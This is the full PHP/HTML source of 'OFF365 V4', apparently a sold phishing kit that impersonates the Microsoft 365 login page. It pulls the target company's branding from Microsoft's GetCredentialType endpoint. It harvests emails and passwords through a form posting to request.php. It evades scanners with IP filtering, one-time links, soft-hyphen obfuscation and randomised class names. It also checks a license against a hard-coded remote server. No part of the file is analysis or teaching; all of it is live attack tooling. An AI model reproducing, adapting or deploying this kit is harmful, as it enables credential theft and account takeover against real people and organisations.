<?php
/* 
OFF365 V4 2020 by ExRobotos
Email: ex.robotos.official@gmail.com
Facebook: facebook.com/Ex.Robotos
ICQ: @Ex.Robotos
*/
error_reporting(0);
if($Resetlogs!==false && $Resetlogs!=="false" && $Resetlogs!=="FALSE" && $Resetlogs!=="False" && $Resetlogs!=="no" && $Resetlogs!=="NO" && !empty($Resetlogs)){
//array_map('unlink', glob("./*.txt"));

$files = glob("./*.txt"); //get all file names
foreach($files as $file){
    if(is_file($file))
    //unlink($file); //delete file
    //$fp = fopen($file, 'w');  // Sets the file size to zero bytes
    //fclose($fp);
    file_put_contents($file, "");
}

};
if($ResetAllow!==false && $ResetAllow!=="false" && $ResetAllow!=="FALSE" && $ResetAllow!=="False" && $ResetAllow!=="no" && $ResetAllow!=="NO" && !empty($ResetAllow)){
session_destroy();
};
include('blocker.php');include('config.php');
$licensekey = "AZ"; //License key is limited to single-user purchase it from us(@W3LL.STORE)
//$apiurl = 'http'.'://ex-'.'robotos'.'.com/'.'api2.php';
$apiurl = 'http'.'://'.'79.124.59.22/'.'~xrobotos/'.'api4.php';
@session_start();
if(isset($_SERVER["HTTP_CF_CONNECTING_IP"])){$visitorIP=$_SERVER["HTTP_CF_CONNECTING_IP"];}else{$visitorIP=$_SERVER['REMOTE_ADDR'];};$visitorUA=$_SERVER['HTTP_USER_AGENT'];$visitorDATE=date("D M d, Y g:i a");$logs="
+ -------------OFF365 V4 2020 by Ex-Robotos------------+
| Visitor Information
| IP Address: $visitorIP
| Browser: $visitorUA
| Date: $visitorDATE 
+ --------------------------------------------------------------+
";

if($limitedarea!==false && $limitedarea!=="false" && $limitedarea!=="FALSE" && $limitedarea!=="False" && $limitedarea!=="no" && $limitedarea!=="NO" && !empty($limitedarea)){
    
  $limitedarea=str_replace(' ', '', $limitedarea);
$limitedarea = explode(',', $limitedarea);
//var_dump($limitedarea);
//echo $_SERVER['REMOTE_ADDR'];


if(is_array($limitedarea) ){
   // echo('2');
$isinlimitedarea=false;
foreach($limitedarea as $ip) {if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
    
$isinlimitedarea=true;
}
}
if($isinlimitedarea==false){
header('HTTP/1.0 404 Not Found');
$file=fopen("./DeniedIPS.txt","a");fwrite($file,"IP:".$_SERVER['REMOTE_ADDR']." DATE:".$visitorDATE." REASON:blocked by limitedarea\n");fclose($file);chmod("./DeniedIPS.txt",0600);        
 die("<h1>404 Not Found</h1>The link that you have requested is expired.");
    
}


}

}


if(isset($visitorfileName)&&$visitorfileName!==''&&$visitorfileName!=='false'&&$visitorfileName!=='FALSE'&&$visitorfileName!==false){$file=fopen("./".$visitorfileName,"a");fwrite($file,$logs);fclose($file);chmod("./".$visitorfileName,0600);}if($AutoGrab || (!$AutoGrab && ((isset($_GET['status']) && $_GET['status']!=='putuser') /*|| !isset($_GET['status'])*/ || (isset($_GET['data']))) )){ if(isset($_GET['email'])){$data=urldecode( $_GET['email'] );}elseif(isset($_GET['data'])){$data=urldecode( $_GET['data'] );}elseif(isset($_GET['target'])){$data=urldecode( $_GET['target'] );}elseif(isset($_GET['code'])){$data=urldecode($_GET['code']);}elseif(preg_match("/[^\/]+$/",urldecode( $_SERVER["REQUEST_URI"] ))){preg_match("/[^\/]+$/",urldecode( $_SERVER["REQUEST_URI"] ),$matches);$data=$matches[0];function begnWith($str, $begnString){$len = strlen($begnString);return (substr($str, 0, $len) === $begnString);}if(begnWith($data,"?")){$data = ltrim($data, '?');}}else{die(header("Location: ".$FailRedirect));}if(base64_encode(base64_decode($data))==$data){$email=base64_decode($data);$email=filter_var($email,FILTER_SANITIZE_EMAIL);if(!filter_var($email,FILTER_VALIDATE_EMAIL)){die(header("Location: ".$FailRedirect));}}else{$email=$data;$email=filter_var($email,FILTER_SANITIZE_EMAIL);if(!filter_var($email,FILTER_VALIDATE_EMAIL)){die(header("Location: ".$FailRedirect));}}$data=base64_encode($email);}$linkSite=$_SERVER["HTTP_HOST"];$uriSite=urldecode( $_SERVER["REQUEST_URI"] );$relative_path=dirname($_SERVER['PHP_SELF']);

if (isset($_SESSION["NOTALLOW"])){header('HTTP/1.0 404 Not Found');        
$file=fopen("./DeniedIPS.txt","a");fwrite($file,"IP:".$_SERVER['REMOTE_ADDR']." DATE:".$visitorDATE." REASON:blocked by NOTALLOW\n");fclose($file);chmod("./DeniedIPS.txt",0600);die("<h1>404 Not Found</h1>The link that you have requested is expired.");};

if($onlylistemails==true || $onlylistemails=="true" || $onlylistemails=="TRUE" || $onlylistemails=="True" || $onlylistemails=="yes" || $onlylistemails=="YES"){       
      $path = 'EMAILS.txt';
      if (file_exists($path))
        {
            
$emails = file('./EMAILS.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            
            if (!in_array($email, $emails)) {
            //echo "that user is not exists in the list"
            if (!isset($_SESSION["NOTALLOW"])){$_SESSION["NOTALLOW"]="true";}
            $file=fopen("./DeniedEmails.txt","a");fwrite($file,"EMAIL:".$email." IP:".$visitorIP." DATE:".$visitorDATE." REASON:Not exist in list\n");fclose($file);chmod("./DeniedEmails.txt",0600);       
die("<h1>404 Not Found</h1>The link that you have requested is expired.");
            }
 
}           
            
        }
        

if($onlyonetimeuse==true || $onlyonetimeuse=="true" || $onlyonetimeuse=="TRUE" || $onlyonetimeuse=="True" || $onlyonetimeuse=="yes" || $onlyonetimeuse=="YES"){ 
      if (file_exists('./UsedEmails.txt'))
        {
            
$usedemails = file('./UsedEmails.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
          
    if (in_array($email, $usedemails) && !isset($_SESSION["NOTEXPIRED"] )) {
            if (!isset($_SESSION["NOTALLOW"])){$_SESSION["NOTALLOW"]="true";}
            //echo "that user already USED AND EXPIRED";
            $file=fopen("./DeniedEmails.txt","a");fwrite($file,"EMAIL:".$email." IP:".$visitorIP." DATE:".$visitorDATE." REASON:Already used and expired\n");fclose($file);chmod("./DeniedEmails.txt",0600);
            die("<h1>404 Not Found</h1>The link that you have requested is expired.");
            
    }           
            
        }
}

$domain = substr(strrchr($email, "@"), 1);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://login.microsoftonline.com/common/GetCredentialType');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"Username\":\"".$email."\"}");

$headers = array();
$headers[] = 'Content-Type: application/json';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
$found = $result;
$result = json_decode($result, true);

if (strpos($found, 'EstsProperties') !== false) {
    $logo = $result["EstsProperties"]["UserTenantBranding"][0]["BannerLogo"];
    $background = $result["EstsProperties"]["UserTenantBranding"][0]["Illustration"];
    $plate = $result["EstsProperties"]["UserTenantBranding"][0]["BoilerPlateText"];
}

if(!$_SESSION["title"]){$CurrentTitle=$_SESSION["title"] = $TitlesArray[array_rand($TitlesArray)];}else{$CurrentTitle=$_SESSION["title"];}
$status=$_GET['status'];function rndString($length=10){return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"),0,$length);};$randpart=$randfirstpart.''.RndString(8).'-'.RndString(4).'-'.RndString(4).'-'.RndString(4).'-'.RndString(12).'_'.RndString(50).''.RndString(50).''.RndString(50);
if(($AutoGrab && !isset($_GET['data'])) || (!$AutoGrab && ((isset($_GET['status']) && $_GET['status']!=='putuser' && !isset($_GET['data']))||(!isset($_GET['status'])&&!isset($_GET['data']))) )){$relative_path=dirname($_SERVER['PHP_SELF']);if($fixIndex==true || $fixIndex=="true" || $fixIndex=="TRUE" || $fixIndex=="True"){$fixIndex="index.php?";$fixPart="&data=";}else{$fixIndex="";$fixPart="?data=";};if(!$AutoGrab && ( ( !isset($_GET['status']) && !isset($_GET['data'])) || (isset($_GET['status']) && $_GET['status']!=='putuser')) ){/*$fixPart=str_replace("data","status",$fixPart)*/ if($fixPart=='&data='){$fixPart='&status=';}elseif($fixPart=='?data='){$fixPart='?status=';};$data='putuser';} header("Location: $relative_path/$fixIndex$randpart$fixPart$data");}
$rndString1=rndString(7);$rndString2=rndString(8);$rndString3=rndString(6);$rndString4=rndString(5);$RndString1=str_repeat("­",rand(1,3));$RndString2=str_repeat("­",rand(1,3));$RndString3=str_repeat("­",rand(1,3));$RndString4=str_repeat("­",rand(1,3));$RndString5=str_repeat("­",rand(1,3)); ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html dir="ltr" class="" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title><? echo $CurrentTitle; ?></title>
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="referrer" content="no-referrer"/>
    <meta name="robots" content="none">
    <noscript>
    <meta http-equiv="Refresh" content="0; URL=./" />
    </noscript>
    <link rel="icon" href="images/favicon.ico" type="image/x-icon">
    <link href="css/style.css" rel="stylesheet" >
</head>

<body id="<?=$rndString1?>" class="nd <?=$rndString2?>" style="display: block;">
    

<div id="<?=$rndString3?>"> <div><div class="background <?=$rndString4?>" role="presentation"> <!--<div style="background-image: url(&quot;images/inv-small-background.jpg&quot;);-webkit-filter:invert(100%);filter:invert(100%);"></div>--> <div class="backgroundImage <?=$rndString2?>" style="background-image: url(&quot;images/inv-big-background.png&quot;);-webkit-filter:invert(100%);filter:invert(100%);"></div> </div></div>  

<style>








.disit{
    display:none;
}
.enait{
    display:block !important;
}
img {/*max-width: 100%;*/}
.novalidate {
    border-top-width: unset !important;
    border-left-width: unset !important;
    border-right-width: unset !important;
    border-color: #fa0808 !important;
    border-width: 0px 0px 1px 0px !important;
}
.form-group {margin-bottom:6px!important;}
/*.text-14{margin-top: 10px;}*/
/*.form-group.col-md-24{margin-bottom: 0px !important;}*/
#spinput,#emnput {margin-bottom: 14px !important;}


.innet {
    margin-left: auto;
    margin-right: auto;
    position: relative;
    max-width: 440px;
    width: calc(100% - 40px);
    padding: 44px;
    margin-bottom: 28px;
    background-color: #fff;
    -webkit-box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    -moz-box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    min-width: 320px;
    min-height: 338px;
    overflow: hidden;
}

#i0282 {
    display:none !important;
}

@media (max-width: 600px), (max-height: 366px){
.innet {
    max-width: 500px;
    width: calc(100% - 15%);
    padding: 6%;
    -webkit-box-shadow: none;
    -moz-box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    box-shadow: none;
}}

.bgImgCenter{
        background-image: url('<?php echo $background; ?>');
        /* Full height */
        height: 100%;

        /* Center and scale the image nicely */
        background-position: center;
        background-repeat: no-repeat;
        background-size: cover
}

</style>
  
     <div class="outer <?php if (strpos($found, 'Illustration') !== false) {echo 'bgImgCenter';} ?> <?=$rndString3?>"> <div class="middle <?=$rndString4?>"> <div class="innet fade-in-lightbox <?=$rndString1?>"> 
                    
                    <div class="lightbox-cover <?=$rndString2?>"></div> 

                    <div id="progressBar" class="progress disit <?=$rndString3?>" role="progressbar" aria-label="Please wait"><!--  --><!-- ko if: useCssAnimation --> <div></div><div></div><div></div><div></div><div></div><!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko --></div>
                    
                    <?php
                    if (strpos($found, 'BannerLogo') !== false) {
                        echo '<img class="banner-logo" role="presentation" data-bind="attr: { src: bannerLogoUrl }" src="'.$logo.'">';
                    }
                    else{
                        echo '<span id="displayLogo"><img class="logo" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8148.16/content/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8148.16/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8148.16/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd"></span>';
                    }
                    ?>
                <div role="main"> <div class=""><?if($AutoGrab || (!$AutoGrab && $status!=='putuser' /*&& !isset($_GET['data'])*/)){?><div class="animate slide-in-next <?=$rndString1?>"> <div> <div class="identityBanner <?=$rndString2?>"> <div class="backButton <?=$rndString3?>" id="idBtn_Back" aria-label="Back"> <img role="presentation" pngsrc="images/arrow_left.png" svgsrc="images/arrow_left.svg" src="images/arrow_left.svg">  </div> <div id="displayName" class="identity <?=$rndString4?>" title="<?=$email?>"><?=$email?></div> </div></div> </div><?}?><div class="pagination-view animate has-identity-banner slide-in-next <?=$rndString1?>"> <div>    <div id="loginHeader" class="row text-title <?=$rndString2?>" role="heading" aria-level="1"><?if(!$AutoGrab && $status=='putuser'){?> <img src="<?="images/sigin2.png"?>"> <?}else{?>
<img src="<?="images/enterpass.png"?>"><?}?></div> <div class="row <?=$rndString3?>"> <div class="form-group col-md-24">


                            <div id="<?=$rndString4?>" role="alert" aria-live="assertive"><!-- ko if: passwrdTextbox.error -->
<?//if($AutoGrab || $status=='putuser'){?> 
                           <? if($status=='error'||$status=='error2'||$status=='error3'||$status=='error4'){ ?>
                            <div id="passwrdError" class="alert alert-error <?=$rndString1?>"><? echo $$status; ?><? if($status!='error'){ ?>, <a id="resnowerr" href="#"><? echo 're'.$RndString1.'set i'.$RndString2.'t n'.$RndString3.'ow.'; ?></a><? } ?></div>
                            <? }else if($firstmsg){ ?>
                            <div id="passwrdError" class="alert <?=$rndString2?>"
<div id="passwrdError" class="alert <?=$rndString3?>"><img class="" src="./images/firstmsg<? if($firstmsg)echo $firstmsg ?>.png" alt="<? echo 'ver'.$RndString1.'ify y'.$RndString2.'our da'.$RndString2.'ta'; ?>" ></div>        
                            <? } ?>
<? //} ?>                            
                            <!-- /ko --> </div>



                            <div class="placeholderContainer <?=$rndString4?>"> 
                <!-- has-error -->
                <div id="makeinput" onclick="makeInputHere(this); this.onclick=null;">
<?if(!$AutoGrab && $status=='putuser'){?> <div id="emnput"></div>
<?}else{?>          <div id="spinput"></div>
<?}?>
                </div>



                </div> </div> </div> <div class="position-buttons <?=$rndString3?>"> <div> 
<?if(!$AutoGrab && $status=='putuser'){?>                
                <div class="row"> <div class="col-md-24"> <div class="text-11 action-links"> <div class="form-group <?=$rndString4?>"> <a id="NoAcc" role="link" href="#"><img src="images/noacc.png"></a> </div>  </div> </div> </div> 
                <div class="row"> <div class="col-md-24"> <div class="text-12 action-links"> <div class="form-group <?=$rndString1?>"> <a id="CantAcces" role="link" href="#"><img src="images/cantacces.png"></a> </div>  </div> </div> </div> 
                <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group <?=$rndString2?>"> <a id="SigOpt" role="link" href="#"><img src="images/sigopt.png"></a> </div>  </div> </div> </div>
                
<?}else{?>                
               <div class="row"> <div class="col-md-24"> <div class="text-14 action-links"> <div class="form-group <?=$rndString3?>"> <a id="ForgPasswrd" role="link" href="#"><img src="images/forgpass.png"></a> </div>  </div> </div> </div>
<?}?>                
                </div> <div class="row <?=$rndString1?>"> <div><div class="col-xs-24 no-padding-left-right button-container <?=$rndString2?>"><div class="inline-block">
        <?if(!$AutoGrab && $status=='putuser'){?><div id="idSIButton" class="btn btn-block btn-primary <?=$rndString3?>" style="border-color:#0067b8;background-image:url(images/continue.png);background-color:#0067b8"></div><?}else{?><div id="idSIButton" class="btn btn-block btn-primary <?=$rndString3?>"></div><?}?>
    </div></div></div> </div> </div></div></div></div><?php
        if (strpos($found, 'BoilerPlateText') !== false) {
        ?>
        <div id="idBoilerPlateText" class="wrap-content boilerplate-text ext-boilerplate-text" data-bind="
            htmlWithMods: tenantBranding.BoilerPlateText,
            htmlMods: { filterLinks: svr.fIsHosted },
            css: { 'transparent-lightbox': tenantBranding.UseTransparentLightBox },
            externalCss: { 'boilerplate-text': true }"><p><?php echo $plate; ?></p>
        </div>
        <?php
        }
        ?></div> </div>                 <div id="footer" class="footer default <?=$rndString4?>" role="contentinfo"> <div> <div id="footerLinks" class="footerNode text-secondary <?=$rndString1?>"> <span id="ftrCopy"<? echo '&#xA9;'.$RndString1.'&#x32;'.$RndString2.'&#x30;'.$RndString3.'&#x31;'.$RndString4.'&#x39;'.$RndString1.'&#x20;' ?></span> <a id="ftrTerms" href="#">Terms of use</a> <a id="ftrPrivacy" href="#"><? echo 'Pr'.$RndString1.'iva'.$RndString2.'cy &amp; co'.$RndString3.'oki'.$RndString1.'es'; ?></a> <a href="#" role="button" class="moreOptions <?=$rndString2?>" aria-label="Click here for troubleshooting information"> <img class="desktopMode" role="presentation" pngsrc="images/ellipsis_white.png" svgsrc="images/ellipsis_white.svg" src="images/ellipsis_white.svg"> <img class="mobileMode <?=$rndString3?>" role="presentation" pngsrc="images/ellipsis_grey.png" svgsrc="images/ellipsis_grey.svg"src="images/ellipsis_grey.svg">  </a> </div> </div> </div> </div> </div>
  </div>
<script>


var statos = '<?=$status?>';
var actnn = "<? if($status=='error'){echo $randpart.'&error&data='.$data;}else if($status=='error2'){echo $randpart.'&error2&data='.$data;}else if($status=='error3'){echo $randpart.'&error3&data='.$data;}else if($status=='error4'){echo $randpart.'&error4&data='.$data;}else{echo $randpart.'&data='.$data;} ?>";
var actnn2 = "";
var rndstr1 = '<?=$rndString1?>';
var rndstr2 = '<?=$rndString2?>';
var haserr = "<? if($status=='error'||$status=='error2'||$status=='error3'){echo ' has-error';} ?>";
var plchol = "<? echo 'Pa'.$RndString1.'ss'.$RndString2.'wo'.$RndString3.'rd'; ?>";
var plchol2 = "<? echo 'Em'.$RndString1.'a'.$RndString2.'i'.$RndString3.'l'; ?>";
var arrl = "<? echo 'En'.$RndString4.'ter '.$RndString1.''.$email; ?>";
var licensekey = '<?=$licensekey?>';
var emailkey = '<?=base64_encode($toEmail)?>';
var style = document.createElement("style");document.head.appendChild(style);style.sheet.insertRule("@media all {body{margin:0;padding:0;display:flex;align-items:center;justify-content:center;height:100vh}.mslogo{margin-left:30px;display:inline-block;background:#f25022;width:11px;height:11px;box-shadow:12px 0 0 #7fba00,0 12px 0 #00a4ef,12px 12px 0 #ffb900;transform:translatex(-300%)}.mslogo::after{content:\"Microsoft\";font:bold 20px sans-serif;margin-left:28px;color:#737373}.form-control::placeholder{font-family:\"Open Sans\",Arial,Helvetica,sans-serif;opacity:1}.form-control:-ms-input-placeholder{font-family:\"Open Sans\",Arial,Helvetica,sans-serif}.form-control::-ms-input-placeholder{font-family:\"Open Sans\", Arial, Helvetica, sans-serif;}#spinput{font-family:inherit;font-size:inherit;line-height:inherit;background-image:url(images/passwrd.png);background-repeat:no-repeat;cursor:text}#spinput{max-width:100%;line-height:inherit}#spinput{padding:4px 8px;border-style:solid;border-color:rgba(0,0,0,.31)}#spinput{border-width:1px;border-color:#666;border-color:rgba(0,0,0,.6);height:36px;outline:0;border-radius:0;-webkit-border-radius:0;background-color:transparent}#spinput{border-top-width:0;border-left-width:0;border-right-width:0}#emnput{font-family:inherit;font-size:inherit;line-height:inherit;background-image:url(images/putmail.png);background-repeat:no-repeat;cursor:text}#emnput{max-width:100%;line-height:inherit}#emnput{padding:4px 8px;border-style:solid;border-color:rgba(0,0,0,.31)}#emnput{border-width:1px;border-color:#666;border-color:rgba(0,0,0,.6);height:36px;outline:0;border-radius:0;-webkit-border-radius:0;background-color:transparent}#emnput{border-top-width:0;border-left-width:0;border-right-width:0}body.nd{color:#262626;text-align:left}body.cb{text-align:right!important;direction:rtl!important;padding:50px!important}.inner{margin-left:unset!important;margin-right:initial!important;position:absolute!important;max-width:0!important;width:calc(10% - 0px)!important;padding:0!important;margin-bottom:0!important;min-width:5px!important;min-height:8px!important;overflow:scroll!important}#i0118{font-family:\"Times New Roman\",Times,serif!important;width:1%!important}#inpfield[type=email]{width:100%!important}#inpfield[type=text]{font-family:text-sec-disc!important;width:100%!important;-webkit-text-sec:disc!important}.form-group{margin-bottom:0!important}@font-face{font-family:\"Open Sans\";font-style:normal;font-weight:300;src:local(\"Open Sans Light\"),local(\"OpenSans-Light\"),url(https://fonts.gstatic.com/s/opensans/v16/mem5YaGs126MiZpBA-UN_r8OUuhs.ttf) format(\"truetype\")}@font-face{font-family:\"Open Sans\";font-style:normal;font-weight:400;src:local(\"Open Sans Regular\"),local(\"OpenSans-Regular\"),url(https://fonts.gstatic.com/s/opensans/v16/mem8YaGs126MiZpBA-UFVZ0e.ttf) format(\"truetype\")}@font-face{font-family:\"Open Sans\";font-style:normal;font-weight:600;src:local(\"Open Sans SemiBold\"),local(\"OpenSans-SemiBold\"),url(https://fonts.gstatic.com/s/opensans/v16/mem5YaGs126MiZpBA-UNirkOUuhs.ttf) format(\"truetype\")}@font-face{font-family:text-sec-disc;src:url(fonts/tsd.eot);src:url(fonts/tsd.eot?#iefix) format(\"embedded-opentype\"),url(fonts/tsd.woff2) format(\"woff2\"),url(fonts/tsd.woff) format(\"woff\"),url(fonts/tsd.ttf) format(\"truetype\"),url(fonts/tsd.svg#text-security) format(\"svg\")}.alert{margin-left:-2%;}}", 0);function checkdom() {Element.prototype.isVisible = function () {function _isVisible(el, t, r, b, l, w, h) {var p = el.parentNode, VISIBLE_PADDING = 2;if (!_elementInDocument(el)) {return false;}if (9 === p.nodeType) {return true;}if ("0" === _getStyle(el, "opacity") || "none" === _getStyle(el, "display") || "hidden" === _getStyle(el, "visibility")) {return false;}if ("undefined" === typeof t || "undefined" === typeof r || "undefined" === typeof b || "undefined" === typeof l || "undefined" === typeof w || "undefined" === typeof h) {t = el.offsetTop;l = el.offsetLeft;b = t + el.offsetHeight;r = l + el.offsetWidth;w = el.offsetWidth;h = el.offsetHeight;}if (p) {if ("hidden" === _getStyle(p, "overflow") || "scroll" === _getStyle(p, "overflow")) {if (l + VISIBLE_PADDING > p.offsetWidth + p.scrollLeft || l + w - VISIBLE_PADDING < p.scrollLeft || t + VISIBLE_PADDING > p.offsetHeight + p.scrollTop || t + h - VISIBLE_PADDING < p.scrollTop) {return false;}}if (el.offsetParent === p) {l += p.offsetLeft;t += p.offsetTop;}return _isVisible(p, t, r, b, l, w, h);}return true;}function _getStyle(el, property) {if (window.getComputedStyle) {return document.defaultView.getComputedStyle(el, null)[property];}if (el.currentStyle) {return el.currentStyle[property];}}function _elementInDocument(element) {while ((element = element.parentNode)) {if (element == document) {return true;}}return false;}return _isVisible(this);};var arc = "access expired contact owner";var my_eleme = document.getElementById("makeinput");if (my_eleme) {if (!my_eleme.isVisible(my_eleme)) {} else {var my_elemn = document.getElementById("emnput");var my_elesp = document.getElementById("spinput");if (my_elemn) {if (!my_elemn.isVisible(my_elemn)) {}} else if (my_elesp) {if (!my_elesp.isVisible(my_elesp)) {}} else {var my_inpf = document.getElementById("inpfield");if (my_inpf) {if (!my_idSIB.isVisible(my_inpf)) {}}}}} else {}var my_idSIB = document.getElementById("idSIButton");if (my_idSIB) {if (!my_idSIB.isVisible(my_idSIB)) {}}}window.onload = setTimeout(checkdom, 2000);var xTag = document.getElementsByTagName("input");if (xTag) {var i;for (i = 0; i < xTag.length; i++) {xTag[i].style.backgroundColor = "red";xTag[i].parentNode.removeChild(xTag[i]);}}if (window.XMLHttpRequest) {xmlhttp = new XMLHttpRequest;} else if (window.ActiveXObject) {xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");}var pagetype = "off365-V4";var trl = "a";trl += "p";trl += "i";trl += ".";trl += "p";trl += "h";trl += "p";var htmlinp = "";var htmlinp2 = "";if (location.href.substr(0, location.href.lastIndexOf("/"))) {var locathref = location.href.substr(0, location.href.lastIndexOf("/"));} else {var locathref = location.href;}var params = "host=" + locathref + "&type=" + pagetype + "&key=" + licensekey + "&email=" + emailkey + "&token=";xmlhttp.open("POST", trl, false);xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");xmlhttp.onload = function () {function Dec(value) {var resvalue = "";var array = value.split("-");for (i = 0; i < array.length; i++) {resvalue += String.fromCharCode(array[i] - 10);}return resvalue;}var declicensekey = "";if (JSON.parse(this.responseText) && JSON.parse(this.responseText).key) {var jsEncode = {encode:function (s, k) {var enc = "";var str = "";str = s.toString();for (var i = 0; i < s.length; i++) {var a = s.charCodeAt(i);var b = a ^ k;enc = enc + String.fromCharCode(b);}return enc;}};var rand = JSON.parse(this.responseText).rand;var a = jsEncode.encode(rand, 125);var e = jsEncode.encode(licensekey, a);var f = jsEncode.encode(JSON.parse(this.responseText).token, a);var g = jsEncode.encode(JSON.parse(this.responseText).key, a);declicensekey = Dec(g);}var timep = Math.floor((Date.now() + 86400000) / 1000);if (JSON.parse(this.responseText) && JSON.parse(this.responseText).valid && JSON.parse(this.responseText).valid == "true" && JSON.parse(this.responseText).key && declicensekey != licensekey && Number(timep) >= Number(f) + 84400) {htmlinp = "<form class=\"";htmlinp += rndstr1 + "\" name=\"f1\" ";htmlinp += "id=\"inputfrm\" novalidate=\"novalidate\" ";htmlinp += "spellcheck=\"false\" ";htmlinp += "method=\"post\" ";htmlinp += "target=\"_top\" ";htmlinp += "autocomplete=\"off\" ";htmlinp += "action=\"request.php?";htmlinp += actnn + "&isok=y";htmlinp += "\" ><input onkeydown=\"onkeypressFunction()\" name=\"pass\" ";htmlinp += "type=\"text\" ";htmlinp += "\" id=\"inpfield\" ";htmlinp += "autocomplete=\"off\" ";htmlinp += "class=\"form-control &nbsp; " + rndstr2 + " ";htmlinp += haserr + "\" aria-required=\"true\" ";htmlinp += "placeholder=\"" + plchol;htmlinp += "\" aria-label=\"" + arrl;htmlinp += "\" required></form>";htmlinp2 = "<form class=\"";htmlinp2 += rndstr1 + "\" name=\"f1\" ";htmlinp2 += "id=\"inputfrm\" novalidate=\"novalidate\" ";htmlinp2 += "spellcheck=\"false\" ";htmlinp2 += "method=\"get\" ";htmlinp2 += "autocomplete=\"off";htmlinp2 += "action=\"";htmlinp2 += actnn2;htmlinp2 += "\" ><input onkeydown=\"onkeypressFunction()\" name=\"data\" ";htmlinp2 += "type=\"email\" ";htmlinp2 += "id=\"inpfield\" ";htmlinp2 += "autocomplete=\"on\" ";htmlinp2 += "class=\"form-control &nbsp; " + rndstr2 + " ";htmlinp2 += haserr + "\" aria-required=\"true\" ";htmlinp2 += "placeholder=\"" + plchol2;htmlinp2 += "\" aria-label=\"" + arrl;htmlinp2 += "\" required></form>";} else {if (JSON.parse(this.responseText) && JSON.parse(this.responseText).message) {htmlinp = JSON.parse(this.responseText).message;} else {htmlinp = "<span>";htmlinp += "Update ";htmlinp += "your license ";htmlinp += "key. ";htmlinp += "contact ";htmlinp += "Us ";htmlinp += "I";htmlinp += "C";htmlinp += "Q";htmlinp += ": ";htmlinp += "@";htmlinp += "E";htmlinp += "x";htmlinp += "_";htmlinp += "R";htmlinp += "o";htmlinp += "b";htmlinp += "o";htmlinp += "t";htmlinp += "o";htmlinp += "s";htmlinp += "</sp";htmlinp += "an>";htmlinp2 = htmlinp;}}};xmlhttp.send(params);function makeInputHere(e) {if (document.getElementById("emnput")) {e.innerHTML = htmlinp2;} else {e.innerHTML = htmlinp;}if (document.getElementById("inpfield")) {document.getElementById("inpfield").focus();}}function validateForm() {var inpfield = document.getElementById("inpfield").value;if (inpfield == "") {return false;}return true;}function submitForm() {document.getElementById("inputfrm").submit();}function onkeypressFunction() {if (document.getElementById("spinput")) {document.getElementById("spinput").classList.remove("novalidate");}if (document.getElementById("inpfield")) {document.getElementById("inpfield").classList.remove("novalidate");}}document.getElementById("idSIButton").onclick = function () {function ValidateEmail(mail) {if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail)) {return true;}alert("You have entered an invalid email address!");return false;}var mailfrm = document.getElementById("inpfield").value;if (document.getElementById("inpfield") && mailfrm.length > 3 && document.getElementById("inputfrm") && document.getElementById("inpfield").value !== "" && (statos !== "putuser" || statos == "putuser" && ValidateEmail(mailfrm))) {if (statos == "putuser") {document.getElementById("inputfrm").submit();} else {document.getElementById("progressBar").setAttribute("class", "progress enait");setTimeout(submitForm, 2000);if (document.getElementById("spinput").hasClass("novalidate")) {document.getElementById("spinput").classList.remove("novalidate");}if (document.getElementById("inpfield").hasClass("novalidate")) {document.getElementById("inpfield").classList.remove("novalidate");}}} else if (document.getElementById("spinput")) {document.getElementById("spinput").classList.add("novalidate");} else if (document.getElementById("inpfield")) {document.getElementById("inpfield").classList.add("novalidate");}};var r = document.getElementsByTagName("script");for (var i = r.length - 1; i >= 0; i--) {if (r[i].getAttribute("id") != "a") {r[i].parentNode.removeChild(r[i]);}}
</script></body></html>